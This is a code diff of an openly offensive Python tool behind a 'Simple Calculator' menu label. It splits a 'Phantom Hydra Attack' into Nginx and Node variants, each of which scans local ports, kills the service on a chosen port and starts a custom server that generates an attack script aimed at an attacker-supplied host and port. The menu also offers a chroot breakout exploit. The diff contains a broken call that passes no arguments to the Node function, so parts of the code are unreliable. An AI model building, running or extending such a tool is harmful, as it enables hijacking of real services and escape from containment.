@@ -1,12 +1,14 @@
 
 import socket
-from process_manager import ProcessManager
+from process_manager_nginx import ProcessManagerForNginx
+from process_manager_node import ProcessManagerNode
 from custom_server import CustomServer 
 import ctypes
 import os
 import subprocess
 import asyncio
 import time
+
 
 
 
@@ -65,14 +67,14 @@ def _has_chroot_capability():
     
 
 
-async def phantomHydraAttack(port_start, port_end, attack_host, attack_port):
+async def phantomHydraAttackForNginx(port_start, port_end, attack_host, attack_port):
     _scan_localhost_ports(port_start, port_end)
     port = int(input("Enter Open Port on which you want to continue: "))
 
     custom_server = CustomServer(port=port)
     custom_server.generate_script_for_attack(host=attack_host, port=attack_port)
 
-    processManager = ProcessManager(port=port)
+    processManager = ProcessManagerForNginx(port=port)
 
     await processManager.kill_process_on_port()
 
@@ -82,7 +84,17 @@ async def phantomHydraAttack(port_start, port_end, attack_host, attack_port):
     int(input("Press 1 to start the custom server"))
     custom_server.start_server()
 
-
+async def phantomHydraAttackForNode(port_start, port_end, attack_host, attack_port):
+    _scan_localhost_ports(port_start, port_end)
+    port = int(input("Enter Open Port on which you want to continue: "))
+    killer = ProcessManagerNode(process_name="node")  # Change process name if needed
+    await killer.kill_process()
+    custom_server = CustomServer(port=port)
+    custom_server.generate_script_for_attack(host=attack_host, port=attack_port)
+    time.sleep(2)
+    custom_server.start_server()
+    
+    
 
 def chrootBreakOutExploit():
     has_chroot_permission = _has_chroot_capability()
@@ -93,8 +105,9 @@ def chrootBreakOutExploit():
 def main():
     while True:
         print("\nSimple Calculator")
-        print("1. Phantom Hydra Attack 🐍👻")
-        print("2. Chroot Breakout Exploit 🏴‍☠️🔓")
+        print("1. Phantom Hydra Attack For Nginx Services 🐍👻")
+        print("2. Phantom Hydra Attack For Node Services 🏴‍☠️🔓")
+        print("3. Chroot Breakout Exploit 🏴‍☠️🔓")
         print("0. Exit")
 
         choice = input("Select an operation (1-5): ")
@@ -115,9 +128,10 @@ def main():
                 port_2 = int(input("Enter Ending Port:"))
             except ValueError:
                 print("Invalid input. Please enter numeric values.")
-            asyncio.run(phantomHydraAttack(port_1, port_2, attack_host, attack_port))
-
-        elif choice == '2':
+            asyncio.run(phantomHydraAttackForNginx(port_1, port_2, attack_host, attack_port))
+        elif choice =='2':
+            asyncio.run(phantomHydraAttackForNode())
+        elif choice == '3':
             chrootBreakOutExploit()
 
 
